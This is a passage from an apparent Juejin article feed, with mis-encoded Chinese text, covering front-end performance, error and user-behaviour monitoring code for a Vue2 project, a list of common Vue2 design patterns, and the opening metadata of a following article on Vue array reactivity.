  errorMonitor.<span class="hljs-title function_">init</span>(); <span class="hljs-comment">// æ–°å¢é”™è¯¯ç›‘æ§</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-9">å››ã€ç”¨æˆ·è¡Œä¸ºç›‘æ§ï¼ˆè¿˜åŸæ“ä½œè·¯å¾„ï¼Œå®šä½é—®é¢˜æ ¹å› ï¼‰</h3>
<h4 data-id="heading-10">1. æ ¸å¿ƒç›‘æ§è¡Œä¸º</h4>
<ul>
<li>é¡µé¢è·³è½¬ï¼ˆè·¯ç”±å˜åŒ–ï¼‰ï¼›</li>
<li>ç‚¹å‡»äº‹ä»¶ï¼ˆæŒ‰é’® / é“¾æ¥ï¼‰ï¼›</li>
<li>è¾“å…¥è¡Œä¸ºï¼ˆè¡¨å•ï¼‰ï¼›</li>
<li>æ¥å£è°ƒç”¨ï¼ˆå’Œé”™è¯¯ / æ€§èƒ½å…³è”ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-11">2. ä»£ç å®ç°ï¼ˆæ–°å»ºÂ <code>src/utils/behaviorMonitor.js</code>ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * ç”¨æˆ·è¡Œä¸ºç›‘æ§æ ¸å¿ƒæ¨¡å—
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. ç›‘æ§è·¯ç”±å˜åŒ–ï¼ˆVue Routerï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchRouterChange</span>();
    <span class="hljs-comment">// 2. å…¨å±€ç›‘å¬ç‚¹å‡»äº‹ä»¶</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchClickEvent</span>();
    <span class="hljs-comment">// 3. ç›‘æ§è¡¨å•è¾“å…¥</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchFormInput</span>();
  },

  <span class="hljs-comment">// ç›‘æ§è·¯ç”±å˜åŒ–</span>
  <span class="hljs-title function_">catchRouterChange</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> router = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./router/index.js'</span>); <span class="hljs-comment">// å¼•å…¥è·¯ç”±å®ä¾‹</span>
    router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'router-change'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">from</span>: <span class="hljs-keyword">from</span>.<span class="hljs-property">fullPath</span>,
        <span class="hljs-attr">to</span>: to.<span class="hljs-property">fullPath</span>,
        <span class="hljs-attr">pageTitle</span>: to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">'unknown'</span>,
      });
    });
  },

  <span class="hljs-comment">// å…¨å±€ç›‘å¬ç‚¹å‡»äº‹ä»¶ï¼ˆè¿‡æ»¤éä¸šåŠ¡å…ƒç´ ï¼‰</span>
  <span class="hljs-title function_">catchClickEvent</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;
      <span class="hljs-comment">// åªç›‘æ§å¸¦ data-behavior æ ‡è®°çš„å…ƒç´ ï¼ˆé¿å…å…¨é‡é‡‡é›†ï¼‰</span>
      <span class="hljs-keyword">const</span> behaviorKey = target.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-behavior'</span>);
      <span class="hljs-keyword">if</span> (!behaviorKey) <span class="hljs-keyword">return</span>;

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'click'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
        behaviorKey, <span class="hljs-comment">// è‡ªå®šä¹‰æ ‡è®°ï¼ˆå¦‚ "btn-submit-order"ï¼‰</span>
        <span class="hljs-attr">targetText</span>: target.<span class="hljs-property">innerText</span>.<span class="hljs-title function_">trim</span>(),
        <span class="hljs-attr">targetSelector</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getSelector</span>(target), <span class="hljs-comment">// å…ƒç´ é€‰æ‹©å™¨</span>
      });
    }, <span class="hljs-literal">true</span>);
  },

  <span class="hljs-comment">// ç›‘æ§è¡¨å•è¾“å…¥ï¼ˆå¸¦ data-behavior çš„è¾“å…¥æ¡†ï¼‰</span>
  <span class="hljs-title function_">catchFormInput</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;
      <span class="hljs-keyword">const</span> behaviorKey = target.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-behavior'</span>);
      <span class="hljs-keyword">if</span> (!behaviorKey || ![<span class="hljs-string">'INPUT'</span>, <span class="hljs-string">'TEXTAREA'</span>].<span class="hljs-title function_">includes</span>(target.<span class="hljs-property">tagName</span>)) <span class="hljs-keyword">return</span>;

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'form-input'</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
        behaviorKey,
        <span class="hljs-attr">inputValue</span>: target.<span class="hljs-property">value</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>), <span class="hljs-comment">// åªé‡‡é›†å‰100å­—ç¬¦ï¼Œé¿å…æ•æ„Ÿä¿¡æ¯</span>
      });
    }, <span class="hljs-literal">true</span>);
  },

  <span class="hljs-comment">// è·å–å…ƒç´ å”¯ä¸€é€‰æ‹©å™¨ï¼ˆä¾¿äºå®šä½ï¼‰</span>
  <span class="hljs-title function_">getSelector</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">if</span> (!el) <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;
    <span class="hljs-keyword">let</span> selector = el.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toLowerCase</span>();
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">id</span>) selector += <span class="hljs-string">`#<span class="hljs-subst">${el.id}</span>`</span>;
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">className</span>) selector += <span class="hljs-string">`.<span class="hljs-subst">${el.className.replace(/\s+/g, <span class="hljs-string">'.'</span>)}</span>`</span>;
    <span class="hljs-keyword">return</span> selector;
  },

  <span class="hljs-comment">// å¤ç”¨ä¸ŠæŠ¥æ–¹æ³•</span>
  <span class="hljs-attr">report</span>: performanceMonitor.<span class="hljs-property">report</span>,
};
</code></pre>
<h4 data-id="heading-12">3. ä¸šåŠ¡ä¸­åŸ‹ç‚¹ä½¿ç”¨</h4>
<p>åœ¨éœ€è¦ç›‘æ§çš„å…ƒç´ ä¸Šæ·»åŠ Â <code>data-behavior</code>Â æ ‡è®°ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- æŒ‰é’®ç‚¹å‡»ç›‘æ§ --&gt;
  &lt;button data-behavior="btn-home-search" @click="search"&gt;æœç´¢&lt;/button&gt;
  
  &lt;!-- è¡¨å•è¾“å…¥ç›‘æ§ --&gt;
  &lt;input data-behavior="input-home-keyword" v-model="keyword" placeholder="è¯·è¾“å…¥å…³é”®è¯"&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-13">4. æŒ‚è½½åˆ°å…¥å£ï¼ˆ<code>main.js</code>ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> behaviorMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/behaviorMonitor'</span>;

<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {
  performanceMonitor.<span class="hljs-title function_">init</span>();
  errorMonitor.<span class="hljs-title function_">init</span>();
  behaviorMonitor.<span class="hljs-title function_">init</span>(); <span class="hljs-comment">// æ–°å¢è¡Œä¸ºç›‘æ§</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-14">äº”ã€è¿›é˜¶ä¼˜åŒ–ï¼ˆé¿å…ç›‘æ§æœ¬èº«å½±å“æ€§èƒ½ï¼‰</h3>
<h4 data-id="heading-15">1. ç™½åå• / é»‘åå•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸ŠæŠ¥æ—¶è¿‡æ»¤æ— éœ€ç›‘æ§çš„é¡µé¢/æ¥å£</span>
<span class="hljs-title function_">report</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-string">'/login'</span>, <span class="hljs-string">'/test'</span>]; <span class="hljs-comment">// è¿‡æ»¤æµ‹è¯•/ç™»å½•é¡µ</span>
  <span class="hljs-keyword">if</span> (blacklist.<span class="hljs-title function_">includes</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>)) <span class="hljs-keyword">return</span>;
  <span class="hljs-comment">// ... åŸæœ‰é€»è¾‘</span>
}
</code></pre>
<h4 data-id="heading-16">2. æ•æ„Ÿä¿¡æ¯è¿‡æ»¤</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸ŠæŠ¥å‰è¿‡æ»¤æ‰‹æœºå·/å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</span>
<span class="hljs-title function_">filterSensitiveData</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">inputValue</span>) {
    data.<span class="hljs-property">inputValue</span> = data.<span class="hljs-property">inputValue</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/1[3-9]\d{9}/g</span>, <span class="hljs-string">'****'</span>); <span class="hljs-comment">// æ‰‹æœºå·è„±æ•</span>
  }
  <span class="hljs-keyword">return</span> data;
}
</code></pre>
<h4 data-id="heading-17">3. ç¦»çº¿ç¼“å­˜é‡è¯•</h4>
<p>ä¸ŠæŠ¥å¤±è´¥æ—¶ç¼“å­˜åˆ° localStorageï¼Œä¸‹æ¬¡é¡µé¢åŠ è½½æ—¶é‡è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åœ¨ sendReport å¤±è´¥å</span>
<span class="hljs-keyword">const</span> failCache = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'monitorFailCache'</span>) || <span class="hljs-string">'[]'</span>);
failCache.<span class="hljs-title function_">push</span>(...cache);
<span class="hljs-comment">// é™åˆ¶ç¼“å­˜å¤§å°ï¼ˆæœ€å¤š 100 æ¡ï¼‰</span>
<span class="hljs-keyword">if</span> (failCache.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100</span>) failCache.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, failCache.<span class="hljs-property">length</span> - <span class="hljs-number">100</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'monitorFailCache'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(failCache));

<span class="hljs-comment">// é¡µé¢åŠ è½½æ—¶é‡è¯•</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> failCache = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'monitorFailCache'</span>) || <span class="hljs-string">'[]'</span>);
  <span class="hljs-keyword">if</span> (failCache.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/monitor/report'</span>, { <span class="hljs-attr">data</span>: failCache })
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'monitorFailCache'</span>));
  }
});
</code></pre>
<hr/>
<h3 data-id="heading-18">å…­ã€æ•°æ®å¯è§†åŒ–ä¸å‘Šè­¦ï¼ˆå¯é€‰æ–¹æ¡ˆï¼‰</h3>
<h4 data-id="heading-19">1. å¼€æºæ–¹æ¡ˆï¼ˆè‡ªå»ºï¼‰</h4>
<ul>
<li>æ•°æ®å­˜å‚¨ï¼šMySQL/ClickHouseï¼ˆé€‚åˆæµ·é‡æ•°æ®ï¼‰ï¼›</li>
<li>å¯è§†åŒ–ï¼šGrafana/ELKï¼ˆKibanaï¼‰ï¼›</li>
<li>å‘Šè­¦ï¼šPrometheus + AlertManagerï¼ˆè§¦å‘é˜ˆå€¼æ—¶é‚®ä»¶ / é’‰é’‰å‘Šè­¦ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-20">2. ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆå¿«é€Ÿæ¥å…¥ï¼‰</h4>
<ul>
<li>é”™è¯¯ç›‘æ§ï¼šFundebugã€Sentryã€FrontJSï¼›</li>
<li>æ€§èƒ½ç›‘æ§ï¼šé˜¿é‡Œäº‘ ARMSã€ç™¾åº¦ç»Ÿè®¡ã€è…¾è®¯ç›‘æ§å®ï¼›</li>
<li>è¡Œä¸ºåˆ†æï¼šç™¾åº¦ç»Ÿè®¡ã€å‹ç›Ÿ +ã€GrowingIOã€‚</li>
</ul>
<h4 data-id="heading-21">3. æ ¸å¿ƒå‘Šè­¦é˜ˆå€¼å‚è€ƒ</h4>

























<table><thead><tr><th>æŒ‡æ ‡</th><th>å‘Šè­¦é˜ˆå€¼</th></tr></thead><tbody><tr><td>JS é”™è¯¯ç‡</td><td>&gt; 0.1%</td></tr><tr><td>æ¥å£å¤±è´¥ç‡</td><td>&gt; 1%</td></tr><tr><td>LCP</td><td>&gt; 4s</td></tr><tr><td>é¦–å±åŠ è½½æ—¶é—´</td><td>&gt; 5s</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-22">ä¸ƒã€æœ€ç»ˆé›†æˆï¼ˆmain.js å®Œæ•´ç¤ºä¾‹ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>;
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;
<span class="hljs-keyword">import</span> performanceMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/performanceMonitor'</span>;
<span class="hljs-keyword">import</span> errorMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/errorMonitor'</span>;
<span class="hljs-keyword">import</span> behaviorMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/behaviorMonitor'</span>;

<span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒå¼€å¯ç›‘æ§</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {
  <span class="hljs-comment">// å…¨å±€æŒ‚è½½ axiosï¼ˆä¾›ç›‘æ§æ¨¡å—ä½¿ç”¨ï¼‰</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">axios</span> = axios;
  <span class="hljs-comment">// åˆå§‹åŒ–ç›‘æ§</span>
  performanceMonitor.<span class="hljs-title function_">init</span>();
  errorMonitor.<span class="hljs-title function_">init</span>();
  behaviorMonitor.<span class="hljs-title function_">init</span>();
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  router,
  <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>)
});
</code></pre>
<p>è¿™å¥—æ–¹æ¡ˆè½»é‡åŒ–ã€å¯æ‰©å±•ï¼Œæ—¢å¯ä»¥å¯¹æ¥è‡ªå»ºåå°ï¼Œä¹Ÿèƒ½å¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬ä¸‰æ–¹ç›‘æ§å¹³å°ï¼Œæ ¸å¿ƒä¼˜åŠ¿æ˜¯ï¼š</p>
<ol>
<li>æ— ä¾µå…¥ï¼šé€šè¿‡å…¨å±€æ··å…¥ã€äº‹ä»¶ç›‘å¬å®ç°ï¼Œä¸ä¿®æ”¹ä¸šåŠ¡ä»£ç ï¼›</li>
<li>é«˜æ€§èƒ½ï¼šæ‰¹é‡ + é˜²æŠ–ä¸ŠæŠ¥ï¼Œæœ¬åœ°ç¼“å­˜é‡è¯•ï¼Œä¸é˜»å¡ä¸»æµç¨‹ï¼›</li>
<li>å…¨è¦†ç›–ï¼šæ€§èƒ½ / é”™è¯¯ / è¡Œä¸ºç»´åº¦å®Œæ•´ï¼Œå¯è¿˜åŸé—®é¢˜ç°åœºã€‚</li>
</ol>
<h2 data-id="heading-23">Vue2ä¸­é¡¹ç›®å®æˆ˜é«˜é¢‘ç”¨åˆ°çš„è®¾è®¡æ¨¡å¼æœ‰å“ªäº›</h2>
<p>åœ¨ Vue2 é¡¹ç›®å®æˆ˜ä¸­ï¼Œä»¥ä¸‹æ˜¯é«˜é¢‘ç”¨åˆ°çš„è®¾è®¡æ¨¡å¼ï¼Œç»“åˆ Vue2 çš„ç‰¹æ€§ï¼ˆå¦‚é€‰é¡¹å¼ APIã€ç»„ä»¶åŒ–ã€å“åº”å¼ï¼‰ï¼Œå®ƒä»¬èƒ½æœ‰æ•ˆæå‡ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ï¼š</p>
<h4 data-id="heading-24">1.Â <strong>å•ä¾‹æ¨¡å¼</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼šå…¨å±€å”¯ä¸€çš„å®ä¾‹ï¼ˆå¦‚ Vuex Storeã€å…¨å±€å¼¹çª—ã€è¯·æ±‚æ‹¦æˆªå™¨ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>Vuex çš„<code>store</code>æ˜¯å•ä¾‹ï¼Œå…¨å±€å…±äº«çŠ¶æ€ï¼›</li>
<li>å…¨å±€æç¤ºç»„ä»¶ï¼ˆå¦‚<code>Toast</code>ï¼‰ï¼Œé€šè¿‡<code>Vue.prototype.$toast = new Toast()</code>æŒ‚è½½ä¸ºå•ä¾‹ï¼Œé¿å…é‡å¤åˆ›å»ºå®ä¾‹ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-25">2.Â <strong>å·¥å‚æ¨¡å¼</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼šæ‰¹é‡åˆ›å»ºç›¸ä¼¼çš„ç»„ä»¶ / å®ä¾‹ï¼Œé¿å…é‡å¤ä»£ç ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>è¡¨å•æ§ä»¶å·¥å‚ï¼šæ ¹æ®é…ç½®ï¼ˆå¦‚<code>{ type: 'input', label: 'å§“å' }</code>ï¼‰åŠ¨æ€ç”Ÿæˆ<code>Input</code>ã€<code>Select</code>ç­‰è¡¨å•ç»„ä»¶ï¼›</li>
<li>å¼¹çª—å·¥å‚ï¼šå°è£…<code>createModal</code>å‡½æ•°ï¼Œä¼ å…¥ç»„ä»¶å’Œå‚æ•°ï¼Œè‡ªåŠ¨åˆ›å»ºå¹¶æŒ‚è½½å¼¹çª—å®ä¾‹ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-26">3.Â <strong>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆå‘å¸ƒ - è®¢é˜…æ¨¡å¼ï¼‰</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼šVue2 çš„å“åº”å¼ç³»ç»Ÿæœ¬èº«åŸºäºè§‚å¯Ÿè€…æ¨¡å¼ï¼ˆ<code>data</code>æ˜¯è¢«è§‚å¯Ÿè€…ï¼Œæ¨¡æ¿ / è®¡ç®—å±æ€§æ˜¯è§‚å¯Ÿè€…ï¼‰ï¼›æ­¤å¤–å¸¸ç”¨äºè·¨ç»„ä»¶é€šä¿¡ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>ç”¨<code>Vue.prototype.$bus = new Vue()</code>å®ç°å…¨å±€äº‹ä»¶æ€»çº¿ï¼ˆå‘å¸ƒ<code>this.$bus.$emit('event')</code>ï¼Œè®¢é˜…<code>this.$bus.$on('event', () =&gt; {})</code>ï¼‰ï¼›</li>
<li>è®¡ç®—å±æ€§ä¾èµ–<code>data</code>å˜åŒ–è‡ªåŠ¨æ›´æ–°ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">4.Â <strong>ä»£ç†æ¨¡å¼</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼šå¯¹å¤æ‚æ“ä½œè¿›è¡Œå°è£…ï¼Œå¯¹å¤–æš´éœ²ç®€åŒ–çš„æ¥å£ï¼ˆå¦‚<strong>è¯·æ±‚ä»£ç†ã€æƒé™ä»£ç†</strong>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li><strong>å°è£…<code>api.js</code></strong> ä½œä¸ºæ¥å£ä»£ç†ï¼Œç»Ÿä¸€å¤„ç†è¯·æ±‚çš„ URL æ‹¼æ¥ã€å‚æ•°æ ¼å¼åŒ–ã€é”™è¯¯æ‹¦æˆªï¼›</li>
<li><strong>æƒé™ä»£ç†ç»„ä»¶</strong>ï¼šå°è£…ä¸€ä¸ª<code>AuthButton</code>ç»„ä»¶ï¼Œæ ¹æ®ç”¨æˆ·æƒé™å†³å®šæŒ‰é’®æ˜¯å¦æ¸²æŸ“ / å¯ç”¨ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-28">5.Â <strong>è£…é¥°å™¨æ¨¡å¼</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼š<strong>åœ¨ä¸ä¿®æ”¹åŸç»„ä»¶çš„å‰æä¸‹ï¼ŒåŠ¨æ€æ‰©å±•å…¶åŠŸèƒ½</strong>ï¼ˆVue2 ä¸­å¸¸ç”¨<code>mixin</code>æˆ–é«˜é˜¶ç»„ä»¶å®ç°ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>ç”¨<code>mixin</code>ç»™å¤šä¸ªç»„ä»¶æ·»åŠ  â€œåŠ è½½çŠ¶æ€ç®¡ç†â€ åŠŸèƒ½ï¼ˆå¦‚<code>loadingMixin</code>åŒ…å«<code>loading</code>æ•°æ®å’Œ<code>setLoading</code>æ–¹æ³•ï¼‰ï¼›</li>
<li><strong>é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰</strong>ï¼šå°è£…<code>withAuth</code>å‡½æ•°ï¼Œæ¥æ”¶ç»„ä»¶å¹¶è¿”å› â€œå¸¦æƒé™æ ¡éªŒâ€ çš„æ–°ç»„ä»¶ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-29">6.Â <strong>ç­–ç•¥æ¨¡å¼</strong></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼š<strong>å°†å¤šç§ â€œç®—æ³• / é€»è¾‘â€ å°è£…ä¸ºç‹¬ç«‹ç­–ç•¥</strong>ï¼Œæ ¹æ®æ¡ä»¶åŠ¨æ€åˆ‡æ¢ï¼ˆæ›¿ä»£å¤§é‡<code>if-else</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li><strong>è¡¨å•éªŒè¯ç­–ç•¥</strong>ï¼šå®šä¹‰<code>required</code>ã€<code>email</code>ã€<code>maxLength</code>ç­‰éªŒè¯ç­–ç•¥ï¼Œæ ¹æ®è¡¨å•é¡¹çš„<code>rules</code>åŠ¨æ€é€‰æ‹©ï¼›</li>
<li>æ”¯ä»˜æ–¹å¼ç­–ç•¥ï¼šå°è£…<code>Alipay</code>ã€<code>WechatPay</code>ç­‰æ”¯ä»˜ç­–ç•¥ï¼Œæ ¹æ®ç”¨æˆ·é€‰æ‹©åˆ‡æ¢æ”¯ä»˜é€»è¾‘ã€‚</li>
</ul>
</li>
</ul>
<p>è¿™äº›æ¨¡å¼åœ¨ Vue2 é¡¹ç›®ä¸­å¹¶éå­¤ç«‹ä½¿ç”¨ï¼ˆä¾‹å¦‚ â€œç»„ä»¶åŒ– + ç­–ç•¥æ¨¡å¼â€ å®ç°åŠ¨æ€è¡¨å•ï¼‰ï¼Œç»“åˆ Vue2 çš„ç‰¹æ€§ï¼ˆå¦‚ mixinã€Vuexã€äº‹ä»¶æ€»çº¿ï¼‰èƒ½æ›´å¥½åœ°è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue æ•°ç»„å“åº”å¼åŸç†æ·±åº¦è§£æï¼šè¿™äº›æ–¹æ³•ä¸ºä½•èƒ½è¢«ç›‘å¬åˆ°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582815307439472691</link>    <guid>https://juejin.cn/post/7582815307439472691</guid>    <pubDate>2025-12-13T01:45:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582815307439472691" data-draft-id="7582814236583690278" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue æ•°ç»„å“åº”å¼åŸç†æ·±åº¦è§£æï¼šè¿™äº›æ–¹æ³•ä¸ºä½•èƒ½è¢«ç›‘å¬åˆ°ï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-13T01:45:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue æ•°ç»„å“åº”å¼åŸç†æ·±åº¦è§£æï¼šè¿™äº›æ–¹æ³•ä¸ºä½•èƒ½è¢«ç›‘å¬åˆ°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T01:45:11.000Z" title="Sat Dec 13 2025 01:45:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
